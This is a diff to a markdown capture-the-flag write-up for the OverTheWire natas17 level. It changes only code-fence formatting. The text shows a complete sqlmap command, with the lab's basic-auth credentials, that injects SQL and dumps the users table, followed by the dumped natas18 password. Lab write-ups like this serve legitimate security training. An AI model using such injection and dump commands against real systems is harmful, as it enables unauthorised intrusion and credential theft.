@@ -21,12 +21,11 @@ lets try to use [SQLMap](http://sqlmap.org/) to inject some SQL. Here's a [cheat
 ```
 sqlmap -u "http://natas17.natas.labs.overthewire.org/index.php" --data=username=natas18 --auth-type=basic --auth-cred=natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw --level=5 --risk=3  --dbms=mysql -D natas17 -T users --dump
 ```
-```
+
 ```
 +----------+----------------------------------+
 | username | password                         |
 +----------+----------------------------------+
 | natas18  | xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP |
 +----------+----------------------------------+
-```
 ```
